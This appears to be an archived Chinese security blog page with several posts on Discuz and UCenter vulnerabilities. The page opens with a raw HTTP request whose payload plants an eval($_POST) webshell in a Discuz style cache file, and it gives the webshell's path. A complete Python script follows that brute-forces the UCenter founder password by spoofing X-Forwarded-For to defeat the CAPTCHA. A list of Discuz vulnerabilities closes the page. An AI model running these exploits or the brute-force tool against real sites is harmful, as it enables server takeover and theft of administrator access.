+<pre><code>POST /bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6 HTTP/1.1
+Accept: image/gif, image/jpeg, image/pjpeg, application/x-ms-application, application/vnd.ms-xpsdocument, application/xaml+xml, application/x-ms-xbap, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, application/x-shockwave-flash, */*
+Referer: http://www.80vul.com/bbs/admincp.php?action=styles&amp;operation=edit&amp;id=6
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Host: www.80vul.com
+Content-Length: 1402
+Connection: Keep-Alive
+Cache-Control: no-cache
+Cookie: 
+
+formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5B249%5D=1&amp;stylevar%5B247%5D=&amp;stylevar%5B248%5D=&amp;stylevar%5B246%5D=&amp;stylevar%5B250%5D=&amp;stylevarbgimg%5B250%5D=&amp;stylevarbgextra%5B250%5D=&amp;stylevar%5B251%5D=&amp;stylevarbgimg%5B251%5D=&amp;stylevarbgextra%5B251%5D=&amp;stylevar%5B252%5D=&amp;stylevarbgimg%5B252%5D=&amp;stylevarbgextra%5B252%5D=&amp;stylevar%5B253%5D=&amp;stylevar%5B254%5D=&amp;stylevar%5B255%5D=&amp;stylevar%5B256%5D=&amp;stylevar%5B257%5D=&amp;stylevar%5B258%5D=&amp;stylevar%5B259%5D=&amp;stylevar%5B260%5D=&amp;stylevar%5B261%5D=&amp;stylevar%5B262%5D=&amp;stylevar%5B263%5D=&amp;stylevar%5B264%5D=&amp;stylevar%5B265%5D=&amp;stylevar%5B266%5D=&amp;stylevar%5B267%5D=&amp;stylevar%5B268%5D=&amp;stylevar%5B269%5D=&amp;stylevar%5B270%5D=&amp;stylevar%5B271%5D=&amp;stylevar%5B272%5D=&amp;stylevar%5B273%5D=&amp;stylevar%5B274%5D=&amp;stylevar%5B275%5D=&amp;stylevarbgimg%5B275%5D=&amp;stylevarbgextra%5B275%5D=&amp;stylevar%5B276%5D=&amp;stylevar%5B277%5D=&amp;stylevar%5B278%5D=&amp;stylevar%5B279%5D=&amp;stylevar%5B280%5D=&amp;stylevar%5B281%5D=&amp;stylevar%5B282%5D=&amp;stylevar%5B283%5D=&amp;stylevarbgimg%5B283%5D=&amp;stylevarbgextra%5B283%5D=&amp;stylevar%5B284%5D=&amp;stylevarbgimg%5B284%5D=&amp;stylevarbgextra%5B284%5D=&amp;stylevar%5B285%5D=&amp;stylevarbgimg%5B285%5D=&amp;stylevarbgextra%5B285%5D=&amp;stylevar%5B286%5D=&amp;stylevar%5B287%5D=&amp;stylevar%5B288%5D=&amp;stylevar%5B289%5D=&amp;stylevar%5B290%5D=&amp;stylevar%5B291%5D=&amp;newcvar=%21%27%2C%2780vul%27%29%3Beval%28%24_post%5Bring%5D%29%3B%2F%2F&amp;newcsubst=exp+by+ring04h%21&amp;editsubmit=%CC%E1%BD%BB
+</code></pre><p>webshell:</p>
+<pre><code>http://www.80vul.com/bbs/forumdata/cache/style_6.php 
+</code></pre>
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-ucenter-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-ucenter-bug-list/" class="post-title-link" itemprop="url">Ucenter vuls list</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:51:04" itemprop="dateCreated datePublished" datetime="2016-05-14T00:51:04+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:28:58" itemprop="dateModified" datetime="2019-03-12T16:28:58+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-ucenter-bug-list/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-ucenter-bug-list/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<ol>
+<li><p>暴力破解创始人密码</p>
+<p> 漏洞文件:<code>/control/app.php:34:onadd</code></p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onadd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$ucfounderpw = getgpc(<span class="string">'ucfounderpw'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptype = getgpc(<span class="string">'apptype'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appname = getgpc(<span class="string">'appname'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appurl = getgpc(<span class="string">'appurl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appip = getgpc(<span class="string">'appip'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$viewprourl = getgpc(<span class="string">'viewprourl'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appcharset = getgpc(<span class="string">'appcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appdbcharset = getgpc(<span class="string">'appdbcharset'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$apptagtemplates = getgpc(<span class="string">'apptagtemplates'</span>, <span class="string">'P'</span>);</span><br><span class="line">	$appallowips = getgpc(<span class="string">'allowips'</span>, <span class="string">'P'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(md5(md5($ucfounderpw).UC_FOUNDERSALT) == UC_FOUNDERPW || (strlen($ucfounderpw) == <span class="number">32</span> &amp;amp;&amp;amp; $ucfounderpw == md5(UC_FOUNDERPW))) &#123;</span><br><span class="line">		@ob_start();</span><br><span class="line">		$return  = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">		$app = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_first(&amp;quot;SELECT * FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications WHERE url=<span class="string">'$appurl'</span> <span class="keyword">AND</span> type=<span class="string">'$apptype'</span>&amp;quot;);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($app)) &#123;</span><br><span class="line">			$authkey = <span class="keyword">$this</span>-&amp;gt;_generate_key();</span><br><span class="line">			$apptagtemplates = <span class="keyword">$this</span>-&amp;gt;serialize($apptagtemplates, <span class="number">1</span>);</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;db-&amp;gt;query(&amp;quot;INSERT INTO &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications SET</span><br><span class="line">				name=<span class="string">'$appname'</span>,</span><br><span class="line">				url=<span class="string">'$appurl'</span>,</span><br><span class="line">				ip=<span class="string">'$appip'</span>,</span><br><span class="line">				authkey=<span class="string">'$authkey'</span>,</span><br><span class="line">				viewprourl=<span class="string">'$viewprourl'</span>,</span><br><span class="line">				synlogin=<span class="string">'1'</span>,</span><br><span class="line">				charset=<span class="string">'$appcharset'</span>,</span><br><span class="line">				dbcharset=<span class="string">'$appdbcharset'</span>,</span><br><span class="line">				type=<span class="string">'$apptype'</span>,</span><br><span class="line">				recvnote=<span class="string">'1'</span>,</span><br><span class="line">				tagtemplates=<span class="string">'$apptagtemplates'</span>,</span><br><span class="line">				allowips=<span class="string">'$appallowips'</span></span><br><span class="line">				&amp;quot;);</span><br><span class="line">			$appid = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;insert_id();</span><br><span class="line"></span><br><span class="line">			$_ENV[<span class="string">'app'</span>]-&amp;gt;alter_app_table($appid, <span class="string">'ADD'</span>);</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$authkey|$appid|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$authkey|$appid|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'cache'</span>);</span><br><span class="line">			$_ENV[<span class="string">'cache'</span>]-&amp;gt;updatedata(<span class="string">'apps'</span>);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">$this</span>-&amp;gt;load(<span class="string">'note'</span>);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;db-&amp;gt;fetch_all(&amp;quot;SELECT appid, type, name, url, ip, charset, synlogin, extra FROM &amp;quot;.UC_DBTABLEPRE.&amp;quot;applications&amp;quot;);</span><br><span class="line">			$notedata = <span class="keyword">$this</span>-&amp;gt;_format_notedata($notedata);</span><br><span class="line">			$notedata[<span class="string">'UC_API'</span>] = UC_API;</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;add(<span class="string">'updateapps'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&amp;gt;serialize($notedata, <span class="number">1</span>));</span><br><span class="line">			$_ENV[<span class="string">'note'</span>]-&amp;gt;send();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">//$return = &amp;quot;UC_STATUS_OK|$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.'|'.UC_DBNAME.'|'.UC_DBUSER.'|'.UC_DBPW.'|'.UC_DBCHARSET.'|'.UC_DBTABLEPRE.'|'.UC_CHARSET;</span></span><br><span class="line">			$return = &amp;quot;$app[authkey]|$app[appid]|&amp;quot;.UC_DBHOST.<span class="string">'|'</span>.UC_DBNAME.<span class="string">'|'</span>.UC_DBUSER.<span class="string">'|'</span>.UC_DBPW.<span class="string">'|'</span>.UC_DBCHARSET.<span class="string">'|'</span>.UC_DBTABLEPRE.<span class="string">'|'</span>.UC_CHARSET;</span><br><span class="line">		&#125;</span><br><span class="line">		@ob_end_clean();</span><br><span class="line">		<span class="keyword">exit</span>($return);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">'-1'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<pre><code>这个函数的意思是 添加一个应用,前提是需要创始人的密码。如果密码正确,就会添加一个应用（如果重复了就直接输出）。
+
+如何利用：
+
+![](http://www.0-f.org/wp-content/uploads/2014/12/Disc_.jpg)
+
+截获个数据包然后放入burp中添加密码字典进行批量破解。
+成功会返回添加应用的信息，反之返回 -1。
+在一些网站中往往把 uc_server/admin.php做了访问限制.
+而index.php这里就可以直接调用破解。返回的应用信息还可以直接getshell或注入。
+测试版本：Discuz! X3.2 搭载的 UCenter 1.6.0
+</code></pre><ol start="2">
+<li><p>暴力破解创始人密码02</p>
+<p> 后台地址一般为：<code>**.**.**.**/discuz/uc_server/admin.php</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/2106555215e9de33121ac345e389897e7a033bb1.png" alt></p>
+<p> 含有一个验证码，验证码的地址为：</p>
+<blockquote>
+<p><a href="http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500" target="_blank" rel="noopener">http://localhost/discuz/uc_server/admin.php?m=seccode&amp;seccodeauth=250dIGq%2FYDhocuXf3IrsBkvB2k23JXlXAbuWr3X1liUcX94&amp;7500</a></p>
+</blockquote>
+<p> 但是，经过测试发现，登录uc_server的时候 如果ip第一次出现那么 seccode的默认值为cccc，而 ip地址 是通过X-Forwarded-For 获取的。也就是我们修改xff的ip之后，再次打开上面那个验证码url，图片的值为cccc</p>
+<p> <img src="http://www.wooyun.org/upload/201410/21071436735b1f7ae3a6d308d74b2a37b80b090e.png" alt></p>
+<p> 所以可以写一个程序通过修改X-Forwarded-For的值爆破密码。</p>
+ <poc>
+
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> httplib,re,random,urllib,time,requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"><span class="comment"># Boom</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span><span class="params">(host, htmlhash, htmlpass, htmlseccode)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php?m=user&amp;a=login'</span></span><br><span class="line">    ip = str(random.randint(<span class="number">1</span>,<span class="number">100</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>))</span><br><span class="line"></span><br><span class="line">    postHead = &#123;<span class="string">'host'</span>: host,</span><br><span class="line">                <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0'</span>,</span><br><span class="line">                <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">                <span class="string">'Accept-Language'</span>: <span class="string">'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3'</span>,</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: ip,</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span> &#125;</span><br><span class="line">    postContent = <span class="string">'sid=&amp;formhash='</span> + htmlhash + <span class="string">'&amp;seccodehidden='</span> + htmlseccode + <span class="string">'&amp;iframe=0&amp;isfounder=1&amp;password='</span> + htmlpass + <span class="string">'&amp;seccode=cccc&amp;submit=%E7%99%BB+%E5%BD%95'</span></span><br><span class="line">    <span class="comment"># resultHtml = httplib.HTTPConnection(host, 80, False)</span></span><br><span class="line">    <span class="comment"># resultHtml.request('POST', '/uc_server/admin.php?m=user&amp;a=login',</span></span><br><span class="line">    <span class="comment">#                    body = postContent,</span></span><br><span class="line">    <span class="comment">#                    headers = postHead )</span></span><br><span class="line">    <span class="comment"># page = resultHtml.getresponse()</span></span><br><span class="line">    <span class="comment"># pageConect = page.read()</span></span><br><span class="line">    page = requests.post(url, headers = postHead, data = postContent)</span><br><span class="line">    <span class="keyword">print</span> str(page.status_code) + <span class="string">'\t'</span> + str(page.history) + <span class="string">'\t'</span> + htmlpass</span><br><span class="line">    pageConect = page.text</span><br><span class="line">    pageSoup = BeautifulSoup(pageConect, <span class="string">"lxml"</span>)</span><br><span class="line">    pageTitle = pageSoup.title.string</span><br><span class="line">    <span class="keyword">return</span> pageTitle,page.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get formhash and seccodehidden</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethashs</span><span class="params">(host)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php'</span></span><br><span class="line">    pageContent = requests.get(url).text</span><br><span class="line">    r1 = re.compile(<span class="string">r'&lt;input type="hidden" name="formhash" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlhash = r1.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    r2 = re.compile(<span class="string">r'&lt;input type="hidden" name="seccodehidden" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlseccode = r2.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> htmlhash + <span class="string">' '</span> + htmlseccode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get host/dict/sleeptime</span></span><br><span class="line"><span class="keyword">if</span>(len(argv)==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' host dictfile sleeptime'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' **.**.**.** pass.txt 0.2'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = argv[<span class="number">1</span>]</span><br><span class="line">    passfile = argv[<span class="number">2</span>]</span><br><span class="line">    sleeptime = argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;host:\t'</span> + host</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;password file:\t'</span> + passfile</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;sleeptime:\t'</span> + sleeptime</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;\n'</span></span><br><span class="line"></span><br><span class="line">    x = gethashs(host).split(<span class="string">' '</span>)</span><br><span class="line">    f = open(passfile, <span class="string">'r'</span>)</span><br><span class="line">    htmlpass = f.readlines()</span><br><span class="line">    <span class="comment"># temp = htmlpass[:]</span></span><br><span class="line">    <span class="comment"># nf = open('temp.new', 'w')</span></span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(htmlpass)):</span><br><span class="line">        pwd = str(htmlpass[i].split())</span><br><span class="line">        time.sleep(float(sleeptime))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(getHtml(host, x[<span class="number">0</span>], pwd, x[<span class="number">1</span>])[<span class="number">0</span>] == <span class="string">''</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'----&gt;Password is: '</span> + pwd</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#     finally:</span></span><br><span class="line">    <span class="comment">#         temp.remove(htmlpass[i])</span></span><br><span class="line">    <span class="comment">#     if i == 1:</span></span><br><span class="line">    <span class="comment">#         raise NameError('test')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># nf.writelines(temp)</span></span><br><span class="line">                    </span><br><span class="line">    <span class="comment"># f.close()</span></span><br><span class="line">    <span class="comment"># nf.close()</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     time.sleep(5.0)</span></span><br><span class="line">        <span class="comment">#     result = getHtml(host, x[0], pwd, x[1])</span></span><br><span class="line">        <span class="comment"># if(result[0] == "UCenter Administrator's Control Panel"):</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># elif 5 in result[1]:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print '----&gt;Password is: ' + pwd</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
+</poc></li>
+</ol>
+<pre><code>`python dz.py **.**.**.** pass.txt 0`
+
+![](http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png)
+</code></pre><ol start="3">
+<li></li>
+</ol>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Jayce Links">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-discuz-bug-list/" class="post-title-link" itemprop="url">Discuz vuls list</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 00:49:23" itemprop="dateCreated datePublished" datetime="2016-05-14T00:49:23+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-12 16:30:27" itemprop="dateModified" datetime="2019-03-12T16:30:27+08:00">2019-03-12</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-discuz-bug-list/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-bug-list/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h1><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞. 
+
+Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞. 
+
+Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip  
+
+Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.   
+
+Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.   
+
+Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.   
+
+Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.     
+
+Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.  
+
+Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.  
+
+Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.  
+
+Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug     
+
